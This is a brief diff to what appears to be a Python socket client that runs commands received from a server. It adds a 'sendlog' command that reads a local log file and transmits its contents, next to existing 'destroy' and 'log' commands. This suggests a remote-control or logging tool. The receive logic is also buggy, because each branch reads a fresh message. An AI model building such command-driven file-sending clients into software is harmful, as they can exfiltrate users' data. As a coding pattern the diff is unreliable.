@@ -1,6 +1,6 @@
 
 import socket
-from main import get_ip,destroy
+from main import get_ip,destroy,log
 
 HEADER = 64
 port = 5050
@@ -26,4 +26,8 @@ while True:
         destroy()
     elif client.recv(HEADER).decode("utf-8")=="slog":
         log()
-    
+    elif client.recv(HEADER).decode("utf-8")=="sendlog":
+        send("sending log......")
+        f = open("programm/log.txt")
+        r  =f.readlines()
+        send(r)
